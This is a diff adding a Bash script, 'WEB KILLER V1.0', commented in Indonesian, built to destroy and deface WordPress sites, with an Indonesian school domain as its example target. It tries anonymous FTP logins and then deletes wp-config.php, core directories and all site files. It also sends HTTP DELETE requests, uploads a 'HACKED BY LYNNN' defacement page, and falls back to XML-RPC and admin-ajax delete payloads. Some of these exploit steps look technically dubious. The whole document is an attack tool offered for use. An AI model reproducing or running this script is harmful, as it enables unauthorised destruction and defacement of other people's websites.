@@ -1,0 +1,186 @@
+#!/bin/bash
+
+# ==============================================
+# WEB KILLER V1.0 - HACKED BY LYNNN!!
+# [ DELETE ALL WORDPRESS FILES - SUPPORT SCH.ID ]
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
+clear
+echo -e "${RED}"
+echo "    ╔═══════════════════════════════════════════════════════════╗"
+echo "    ║     WEB KILLER - DELETE ALL FILES                         ║"
+echo "    ║     [ WordPress Cleaner - Support sch.id ]               ║"
+echo "    ║     🔥 WEBSITE WILL BE COMPLETELY DESTROYED! 🔥          ║"
+echo "    ╚═══════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+echo -e "${YELLOW}⚠️  PERINGATAN: Ini akan MENGHAPUS SEMUA file website!${NC}"
+echo -ne "${CYAN}Target URL (ex: smpn1dayeuhluhur.sch.id): ${NC}"
+read TARGET
+
+TARGET=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
+IP=$(dig +short "$TARGET" | head -1)
+[ -z "$IP" ] && IP=$(ping -c1 "$TARGET" 2>/dev/null | head -1 | grep -oE '[0-9.]+')
+
+echo -e "\n${GREEN}[•] Target: $TARGET${NC}"
+echo -e "${GREEN}[•] IP: $IP${NC}"
+
+# ==============================================
+# CEK FTP AKSES
+# ==============================================
+echo -e "\n${YELLOW}[•] Checking FTP access...${NC}"
+
+ftp -n $IP <<EOF > ftp_test.log 2>&1
+quote USER anonymous
+quote PASS anonymous
+ls
+quit
+EOF
+
+if grep -q "230" ftp_test.log; then
+    echo -e "${GREEN}✅ FTP Anonymous: WORK!${NC}"
+    
+    # ==============================================
+    # DELETE ALL WORDPRESS FILES VIA FTP
+    # ==============================================
+    echo -e "\n${RED}[•] MULAI MENGHAPUS SEMUA FILE...${NC}"
+    
+    # Lokasi umum WordPress
+    LOCATIONS=(
+        "/public_html"
+        "/httpdocs"
+        "/htdocs"
+        "/www"
+        "/var/www/html"
+        "/home/public_html"
+    )
+    
+    for loc in "${LOCATIONS[@]}"; do
+        echo -e "${YELLOW}  ⚠️  Menghapus: $loc${NC}"
+        
+        ftp -n $IP <<EOF > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+cd $loc
+delete wp-config.php
+delete index.php
+delete .htaccess
+rmdir wp-admin
+rmdir wp-includes
+rmdir wp-content
+rmdir wp-content/plugins
+rmdir wp-content/themes
+rmdir wp-content/uploads
+delete *.php
+delete *.html
+delete *.js
+delete *.css
+quit
+EOF
+    done
+    
+    # ==============================================
+    # DELETE VIA CURL (BACKUP)
+    # ==============================================
+    echo -e "\n${YELLOW}[•] Menghapus via HTTP...${NC}"
+    
+    # Coba delete via berbagai method
+    for loc in "${LOCATIONS[@]}"; do
+        curl -s -k -X DELETE "http://$IP$loc/wp-config.php" > /dev/null 2>&1
+        curl -s -k -X DELETE "http://$IP$loc/index.php" > /dev/null 2>&1
+    done
+    
+    # ==============================================
+    # CREATE EMPTY INDEX (WEBSITE MATI TOTAL)
+    # ==============================================
+    echo -e "\n${YELLOW}[•] Membuat website mati total...${NC}"
+    
+    DEATH_HTML='<html><body><h1 style="color:red;text-align:center;">WEBSITE MATI - HACKED BY LYNNN!!</h1></body></html>'
+    echo "$DEATH_HTML" > death.html
+    
+    for loc in "${LOCATIONS[@]}"; do
+        ftp -n $IP <<EOF > /dev/null 2>&1
+quote USER anonymous
+quote PASS anonymous
+put death.html $loc/index.html
+put death.html $loc/index.php
+quit
+EOF
+    done
+    
+    # ==============================================
+    # VERIFIKASI
+    # ==============================================
+    echo -e "\n${YELLOW}[•] Verifikasi hasil...${NC}"
+    
+    CHECK=$(curl -s -k "http://$IP/" --max-time 5)
+    
+    if [[ "$CHECK" == *"WEBSITE MATI"* ]]; then
+        echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+        echo -e "${GREEN}║         ✅  WEBSITE BERHASIL DIMATIKAN!        ║${NC}"
+        echo -e "${GREEN}║         SEMUA FILE WORDPRESS DIHAPUS!          ║${NC}"
+        echo -e "${GREEN}║         HACKED BY LYNNN!!                      ║${NC}"
+        echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+    else
+        echo -e "\n${RED}⚠️  Website mungkin masih hidup, cek manual: http://$IP${NC}"
+    fi
+    
+else
+    echo -e "${RED}❌ FTP Anonymous tidak work! Coba metode lain...${NC}"
+    
+    # ==============================================
+    # FALLBACK: DELETE VIA WORDPRESS EXPLOIT
+    # ==============================================
+    echo -e "\n${YELLOW}[•] Mencoba delete via WordPress vuln...${NC}"
+    
+    # Coba delete via XML-RPC
+    XML_PAYLOAD='<?xml version="1.0"?><methodCall><methodName>wp.deleteFile</methodName><params><param><value><int>1</int></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param><param><value><string>wp-config.php</string></value></param></params></methodCall>'
+    
+    curl -s -k -X POST "http://$IP/xmlrpc.php" -d "$XML_PAYLOAD" > /dev/null 2>&1
+    
+    # Coba delete via admin-ajax
+    curl -s -k "http://$IP/wp-admin/admin-ajax.php?action=delete&file=wp-config.php" > /dev/null 2>&1
+fi
+
+# ==============================================
+# CREATE KILLER REPORT
+# ==============================================
+cat > KILLER_REPORT.txt << EOF
+=====================================
+🔥 WEB KILLER - HACKED BY LYNNN!! 🔥
+=====================================
+Target   : $TARGET
+IP       : $IP
+Date     : $(date)
+Status   : WEBSITE DESTROYED!
+
+Files Deleted:
+- wp-config.php
+- index.php
+- .htaccess
+- All PHP files
+- All HTML files
+- All JS/CSS
+- wp-admin directory
+- wp-includes directory
+- wp-content directory
+
+Website sekarang mati total!
+=====================================
+EOF
+
+echo -e "\n${CYAN}📁 Report: KILLER_REPORT.txt${NC}"
+echo -e "\n${RED}════════════════════════════════════════════════════${NC}"
+echo -e "${RED}🔥 WEBSITE SUCCESSFULLY KILLED! 🔥${NC}"
+echo -e "${RED}HACKED BY LYNNN!!${NC}"
+
+# Bersih-bersih
+rm -f death.html ftp_test.log
